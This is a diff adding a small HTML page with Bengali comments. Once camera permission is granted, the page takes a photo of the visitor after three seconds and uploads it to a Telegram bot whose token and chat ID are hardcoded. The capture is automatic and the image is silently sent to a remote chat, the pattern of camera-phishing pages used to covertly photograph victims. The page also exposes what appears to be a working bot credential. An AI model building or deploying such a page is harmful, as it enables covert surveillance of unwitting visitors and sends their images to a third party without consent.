@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capture and Send Image</title>
+</head>
+<body>
+    <h1>Capturing Image Automatically</h1>
+    <video id="video" width="640" height="480" autoplay></video>
+    <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        // ক্যামেরা অ্যাক্সেস করা
+        navigator.mediaDevices.getUserMedia({ video: true })
+        .then((stream) => {
+            video.srcObject = stream;
+
+            // ক্যামেরা চালু হওয়ার পর ছবিটি স্বয়ংক্রিয়ভাবে তুলে পাঠানো
+            setTimeout(() => {
+                captureAndSend();
+            }, 3000);  // ৩ সেকেন্ড পর ছবি তোলা হবে
+        })
+        .catch((err) => {
+            console.log('Error: ' + err);
+        });
+
+        // ছবি ক্যাপচার করা এবং টেলিগ্রামে পাঠানো
+        function captureAndSend() {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(function(blob) {
+                const formData = new FormData();
+                formData.append("chat_id", "6495097439"); // আপনার চ্যাট আইডি দিন
+                formData.append("photo", blob);
+
+                // টেলিগ্রামে ছবি পাঠানোর জন্য API কল
+                fetch(`https://api.telegram.org/bot7857170617:AAFZjiZWqFRd7IGTffzSIai8LWMRIGHj42Y/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => console.log(data))
+                .catch(error => console.error('Error:', error));
+            }, 'image/jpeg');
+        }
+    </script>
+</body>
+</html>
